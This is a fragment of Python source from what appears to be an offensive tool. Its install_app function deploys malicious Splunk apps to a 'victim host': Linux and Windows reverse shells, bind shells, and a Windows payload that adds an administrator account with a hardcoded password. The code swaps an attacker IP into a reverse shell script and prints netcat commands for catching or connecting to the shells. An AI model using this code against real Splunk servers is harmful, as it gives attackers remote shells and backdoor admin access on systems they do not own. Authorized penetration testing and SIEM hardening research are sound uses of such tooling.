...
def install_app(splunkServer, appname):
	...
	if appname == "rshell.tar.gz":  # linux python reverse shell
		...
		with open(
				os.path.join(basedir, 'reverse_shell_original.py')) as f:  # replace the attackerip
	...
	if appname != "None":
		...
		for result in results:
			print(SEPARATOR)
			print("[!] Application Successfully Installed " + Fore.RED + Style.BRIGHT +
			result.text)
			print(SEPARATOR)
			server.shutdown()
			...
			if appname == "rshell.tar.gz" or appname == "wrshell.tar.gz":  # reverse shells
				print(
					Fore.RED + Style.BRIGHT + "[!] Please start a listener on the attacker host "
					"port 12345, for example: nc -lvp 12345")
			if (
					appname == "bshell.tar.gz" or appname == "wbshell.tar.gz" or appname ==
					"wbshellexe.tar.gz"):  # bind shells
				print(
					Fore.RED + Style.BRIGHT + "[!] Please connect to the victim host on port "
					"12346, for example: nc -v " + splunkServer + " 12346")
			if appname == "wadduser.tar.gz":  # windows adduser
				print(
					Fore.RED + Style.BRIGHT + "[!] Administrator user added on the victim host " +
					splunkServer + ", user: siemadmin with password: siemadmin123$")
			print(SEPARATOR)
